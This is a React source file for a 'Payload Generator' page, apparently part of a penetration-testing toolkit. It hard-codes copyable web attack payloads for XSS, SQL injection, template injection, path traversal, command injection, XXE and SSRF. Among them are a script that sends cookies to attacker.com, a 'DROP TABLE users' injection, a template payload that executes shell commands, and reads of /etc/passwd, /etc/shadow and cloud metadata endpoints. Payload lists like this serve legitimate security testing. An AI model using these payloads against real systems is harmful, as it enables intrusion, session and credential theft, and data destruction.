'use client'
import { useState } from 'react'
import { Copy, Check } from 'lucide-react'
import { clsx } from 'clsx'

type Category = 'XSS' | 'SQLi' | 'SSTI' | 'PathTraversal' | 'CmdInjection' | 'XXE' | 'SSRF'

const PAYLOADS: Record<Category, string[]> = {
  XSS: [
    `<script>alert(1)</script>`,
    `<img src=x onerror=alert(1)>`,
    `<svg onload=alert(1)>`,
    `"><script>alert(document.domain)</script>`,
    `javascript:alert(1)`,
    `<iframe src="javascript:alert(1)">`,
    `<body onload=alert(1)>`,
    `<input autofocus onfocus=alert(1)>`,
    `{{7*7}}`,
    `<details open ontoggle=alert(1)>`,
    `<img src=x onerror=fetch('//attacker.com?c='+document.cookie)>`,
    `"><img src=x onerror=eval(atob('YWxlcnQoMSk='))>`,
  ],
  SQLi: [
    `' OR '1'='1`,
    `' OR 1=1--`,
    `' OR 1=1#`,
    `admin'--`,
    `' UNION SELECT NULL--`,
    `' UNION SELECT NULL,NULL--`,
    `' UNION SELECT username,password FROM users--`,
    `1; DROP TABLE users--`,
    `' AND SLEEP(5)--`,
    `' AND 1=CONVERT(int,@@version)--`,
    `' OR BENCHMARK(5000000,MD5(1))--`,
    `' OR 1=1 LIMIT 1--`,
    `1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)`,
    `') OR ('x'='x`,
  ],
  SSTI: [
    `{{7*7}}`,
    `${7*7}`,
    `<%= 7*7 %>`,
    `{{config}}`,
    `{{self.__dict__}}`,
    `{% for c in [].class.base.subclasses() %}{{c.name}}{% endfor %}`,
    `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`,
    `*{7*7}`,
    `#{7*7}`,
    `@{7*7}`,
  ],
  PathTraversal: [
    `../../../etc/passwd`,
    `..\\..\\..\\windows\\win.ini`,
    `....//....//....//etc/passwd`,
    `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`,
    `..%2F..%2F..%2Fetc%2Fpasswd`,
    `/etc/passwd`,
    `C:\\Windows\\System32\\drivers\\etc\\hosts`,
    `file:///etc/passwd`,
    `%252e%252e%252fetc%252fpasswd`,
    `..%c0%af..%c0%af..%c0%afetc/passwd`,
  ],
  CmdInjection: [
    `; id`,
    `| id`,
    `&& id`,
    `\`id\``,
    `$(id)`,
    `; cat /etc/passwd`,
    `| cat /etc/passwd`,
    `; ping -c 4 attacker.com`,
    `|| sleep 10`,
    `& ping -n 4 attacker.com &`,
    `{IFS}cat{IFS}/etc/passwd`,
    `$IFS$()cat$IFS/etc/passwd`,
  ],
  XXE: [
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.xml">]><foo>&xxe;</foo>`,
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>`,
    `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>`,
  ],
  SSRF: [
    `http://localhost/admin`,
    `http://127.0.0.1:8080/admin`,
    `http://169.254.169.254/latest/meta-data/`,
    `http://metadata.google.internal/computeMetadata/v1/`,
    `http://[::1]/admin`,
    `http://0.0.0.0/admin`,
    `http://2130706433/admin`,
    `http://127.1/admin`,
    `http://0177.0.0.1/admin`,
  ],
}

const CATEGORY_STYLE: Record<Category, string> = {
  XSS:           'text-purple-400 border-purple-500/30 bg-purple-500/10',
  SQLi:          'text-red-400    border-red-500/30    bg-red-500/10',
  SSTI:          'text-orange-400 border-orange-500/30 bg-orange-500/10',
  PathTraversal: 'text-yellow-400 border-yellow-500/30 bg-yellow-500/10',
  CmdInjection:  'text-green-400  border-green-500/30  bg-green-500/10',
  XXE:           'text-cyan-400   border-cyan-500/30   bg-cyan-500/10',
  SSRF:          'text-blue-400   border-blue-500/30   bg-blue-500/10',
}

export default function PayloadsPage() {
  const [cat, setCat]       = useState<Category>('XSS')
  const [filter, setFilter] = useState('')
  const [copied, setCopied] = useState<string>('')

  const payloads = PAYLOADS[cat].filter(p => !filter || p.toLowerCase().includes(filter.toLowerCase()))

  function copy(p: string) {
    navigator.clipboard.writeText(p)
    setCopied(p); setTimeout(() => setCopied(''), 1500)
  }

  function copyAll() {
    navigator.clipboard.writeText(payloads.join('\n'))
    setCopied('__all__'); setTimeout(() => setCopied(''), 1500)
  }

  return (
    <div className="p-6 max-w-3xl mx-auto space-y-6">
      <div>
        <h1 className="font-mono text-lg font-bold text-cyber-text-hi tracking-wide">Payload Generator</h1>
        <p className="font-mono text-xs text-cyber-muted mt-1">XSS, SQLi, SSTI, path traversal, command injection, XXE, SSRF — copy individual or all</p>
      </div>

      <div className="flex flex-wrap gap-1.5">
        {(Object.keys(PAYLOADS) as Category[]).map(c => (
          <button key={c} onClick={() => { setCat(c); setFilter('') }}
            className={clsx('px-3 py-1.5 font-mono text-xs rounded border transition-all', cat === c
              ? CATEGORY_STYLE[c]
              : 'text-cyber-muted border-cyber-border hover:text-cyber-text hover:border-cyber-text/20')}>
            {c}
          </button>
        ))}
      </div>

      <div className="flex gap-2">
        <input value={filter} onChange={e => setFilter(e.target.value)}
          placeholder="Filter payloads..."
          className="flex-1 bg-cyber-bg border border-cyber-border rounded px-3 py-1.5 font-mono text-xs text-cyber-text placeholder-cyber-muted focus:outline-none focus:border-cyber-cyan/60"
        />
        <button onClick={copyAll}
          className="px-3 py-1.5 font-mono text-xs text-cyber-cyan bg-cyber-cyan/10 border border-cyber-cyan/30 rounded hover:bg-cyber-cyan/20 transition-all flex items-center gap-1.5">
          {copied === '__all__' ? <><Check size={11} /> Copied all</> : <><Copy size={11} /> Copy all ({payloads.length})</>}
        </button>
      </div>

      <div className="bg-cyber-surface border border-cyber-border rounded-lg overflow-hidden">
        <div className="divide-y divide-cyber-border">
          {payloads.map((p, i) => (
            <div key={i} className="flex items-center gap-3 px-4 py-2.5 hover:bg-cyber-cyan/5 group">
              <code className="font-mono text-xs text-cyber-text flex-1 break-all whitespace-pre-wrap">{p}</code>
              <button onClick={() => copy(p)}
                className="flex-none text-cyber-muted group-hover:text-cyber-cyan transition-colors">
                {copied === p ? <Check size={13} className="text-green-400" /> : <Copy size={13} />}
              </button>
            </div>
          ))}
        </div>
      </div>
    </div>
  )
}
